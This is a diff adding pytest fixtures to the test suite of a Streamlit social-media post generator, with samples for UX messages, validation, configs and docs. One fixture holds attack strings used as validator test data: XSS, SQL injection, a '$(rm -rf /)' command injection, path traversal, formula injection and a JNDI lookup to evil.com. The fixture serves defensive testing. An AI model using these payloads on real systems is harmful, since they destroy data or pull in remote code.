@@ -478,3 +478,298 @@ def unicode_test_posts():
         "Post with currency: $ € £ ¥ ₹ ₿",
         "Post with special chars: ©™®°±×÷≠≤≥∞"
     ]
+
+
+# Phase 6 Testing Fixtures
+
+@pytest.fixture
+def mock_user_experience_components():
+    """Mock Streamlit components for UX testing."""
+    return {
+        'spinner': MagicMock(),
+        'success': MagicMock(),
+        'error': MagicMock(),
+        'warning': MagicMock(),
+        'info': MagicMock(),
+        'progress': MagicMock(),
+        'text_input': MagicMock(),
+        'selectbox': MagicMock(),
+        'file_uploader': MagicMock(),
+        'button': MagicMock(),
+        'metric': MagicMock(),
+        'columns': MagicMock()
+    }
+
+
+@pytest.fixture
+def sample_user_feedback_scenarios():
+    """Sample scenarios for user feedback testing."""
+    return {
+        'success_scenarios': [
+            ("post_generation", "🎉 Successfully generated 5 posts for LinkedIn!"),
+            ("file_upload", "✅ Files uploaded and processed successfully!"),
+            ("csv_export", "📄 CSV export completed successfully!"),
+            ("validation_passed", "🔍 All inputs validated successfully!")
+        ],
+        'error_scenarios': [
+            ("missing_api_key", "🔑 Please enter your API key"),
+            ("invalid_file", "📁 Invalid file format. Please upload .txt, .docx, .pdf, or .md files"),
+            ("api_failure", "❌ API request failed. Please check your API key and try again"),
+            ("generation_error", "💥 Post generation failed. Please try again with different settings")
+        ],
+        'warning_scenarios': [
+            ("char_limit", "⚠️ Post exceeds platform character limit"),
+            ("large_file", "🚨 Large file detected - processing may take longer"),
+            ("rate_limit", "⏰ API rate limit approached - please wait before next request"),
+            ("empty_content", "📝 Some content areas are empty")
+        ],
+        'info_scenarios': [
+            ("workflow_tip", "💡 Tip: Upload a brand guide for better post consistency"),
+            ("platform_info", "📊 LinkedIn posts perform best with professional tone"),
+            ("export_ready", "📋 Ready to export 5 validated posts"),
+            ("processing_info", "🔄 Processing files in background...")
+        ]
+    }
+
+
+@pytest.fixture
+def input_validation_test_cases():
+    """Test cases for input validation."""
+    return {
+        'api_keys': {
+            'valid': [
+                "sk-1234567890abcdef1234567890abcdef",
+                "sk-ant-api03-1234567890abcdef",
+                "AIzaSy1234567890abcdef1234567890"
+            ],
+            'invalid': [
+                "",
+                "invalid",
+                "sk-",
+                "test123",
+                "api_key_here"
+            ]
+        },
+        'file_formats': {
+            'valid': [
+                "document.txt",
+                "report.pdf", 
+                "guide.docx",
+                "notes.md",
+                "history.xlsx"
+            ],
+            'invalid': [
+                "image.jpg",
+                "script.py",
+                "malware.exe",
+                "data.csv",
+                "archive.zip"
+            ]
+        },
+        'post_counts': {
+            'valid': [1, 5, 10, 25, 50],
+            'invalid': [0, -1, 51, 100, 1000]
+        },
+        'platforms': {
+            'valid': ["X", "LinkedIn", "Facebook", "Instagram"],
+            'invalid': ["Twitter", "TikTok", "YouTube", "Pinterest", "InvalidPlatform"]
+        }
+    }
+
+
+@pytest.fixture
+def code_quality_test_files():
+    """Sample code files for quality testing."""
+    return {
+        'good_code': '''
+def process_data(data: List[str]) -> Tuple[bool, str]:
+    """
+    Process input data with validation.
+    
+    Args:
+        data: List of strings to process
+        
+    Returns:
+        Tuple of (success, message)
+    """
+    try:
+        if not data:
+            return False, "No data provided"
+            
+        processed = []
+        for item in data:
+            if isinstance(item, str) and item.strip():
+                processed.append(item.strip())
+                
+        return True, f"Processed {len(processed)} items"
+        
+    except Exception as e:
+        logger.error(f"Processing failed: {e}")
+        return False, f"Error: {str(e)}"
+''',
+        'poor_code': '''
+def process(x):
+    print("DEBUG: processing", x)  # TODO: remove this
+    result = []
+    for i in x:
+        try:
+            result.append(i.strip())
+        except:
+            pass
+    return result
+''',
+        'config_file': '''
+LLM_PROVIDERS = ["OpenAI", "Google Gemini", "Anthropic"]
+TARGET_PLATFORMS = ["X", "LinkedIn", "Facebook", "Instagram"]
+SUPPORTED_TEXT_FORMATS = [".txt", ".docx", ".pdf", ".md"]
+MAX_FILE_SIZE_MB = 10
+'''
+    }
+
+
+@pytest.fixture
+def security_test_cases():
+    """Security test cases for validation."""
+    return {
+        'malicious_inputs': [
+            "<script>alert('xss')</script>",
+            "'; DROP TABLE users; --",
+            "$(rm -rf /)",
+            "../../../etc/passwd",
+            "{{7*7}}",
+            "=SUM(1+1)*cmd|calc",
+            "${jndi:ldap://evil.com}"
+        ],
+        'safe_inputs': [
+            "Normal text content",
+            "Brand guide with instructions",
+            "Social media post with hashtags #marketing",
+            "Product description with features"
+        ],
+        'file_security': {
+            'safe_files': [
+                ("document.txt", "text/plain", 1024),
+                ("report.pdf", "application/pdf", 1024*1024),
+                ("guide.docx", "application/vnd.openxmlformats-officedocument.wordprocessingml.document", 512*1024)
+            ],
+            'unsafe_files': [
+                ("malware.exe", "application/x-executable", 1024),
+                ("script.js", "application/javascript", 1024),
+                ("large_file.txt", "text/plain", 100*1024*1024)
+            ]
+        }
+    }
+
+
+@pytest.fixture
+def performance_test_data():
+    """Data for performance testing."""
+    return {
+        'large_text': "This is a sample line of text for performance testing.\n" * 10000,
+        'many_files': [
+            f"File {i} content with substantial text for performance testing" * 100 
+            for i in range(50)
+        ],
+        'complex_processing': {
+            'input_size': 1000,
+            'expected_time_limit': 5.0,  # seconds
+            'memory_limit_mb': 100
+        }
+    }
+
+
+@pytest.fixture
+def deployment_test_configs():
+    """Configuration scenarios for deployment testing."""
+    return {
+        'production_config': {
+            'debug': False,
+            'log_level': 'INFO',
+            'session_timeout': 3600,
+            'max_file_size': 10 * 1024 * 1024,
+            'rate_limiting': True,
+            'security_headers': {
+                'X-Frame-Options': 'DENY',
+                'X-Content-Type-Options': 'nosniff',
+                'X-XSS-Protection': '1; mode=block'
+            }
+        },
+        'development_config': {
+            'debug': True,
+            'log_level': 'DEBUG',
+            'session_timeout': 1800,
+            'max_file_size': 5 * 1024 * 1024,
+            'rate_limiting': False
+        },
+        'requirements_content': '''
+streamlit==1.29.0
+pandas==2.1.4
+python-docx==1.1.0
+PyMuPDF==1.23.14
+openpyxl==3.1.2
+google-generativeai==0.3.2
+openai==1.3.7
+anthropic==0.7.7
+''',
+        'invalid_requirements': '''
+streamlit
+pandas
+python-docx>=1.0
+'''
+    }
+
+
+@pytest.fixture
+def documentation_test_content():
+    """Sample documentation content for testing."""
+    return {
+        'good_readme': '''
+# Auto Post Generator
+
+## Description
+AI-powered social media post generator for businesses.
+
+## Installation
+1. Create virtual environment: `python -m venv venv`
+2. Activate environment: `source venv/bin/activate`
+3. Install dependencies: `pip install -r requirements.txt`
+
+## Usage
+```bash
+streamlit run app.py
+```
+
+## Requirements
+- Python 3.8+
+- API keys for LLM providers
+
+## Configuration
+Set environment variables for API keys.
+''',
+        'poor_readme': '''
+# App
+
+This is an app.
+
+Run it.
+''',
+        'good_docstring': '''
+        Create CSV export of generated posts.
+        
+        Args:
+            posts: List of final edited posts
+            platform: Target platform name
+            include_metadata: Whether to include additional metadata
+            
+        Returns:
+            tuple[str, str]: (csv_string, filename)
+            
+        Raises:
+            ValueError: If posts list is empty
+            
+        Example:
+            >>> posts = ["Post 1", "Post 2"]
+            >>> csv_data, filename = create_csv_export(posts, "LinkedIn")
+        ''',
+        'poor_docstring': 'Does stuff with posts.'
+    }
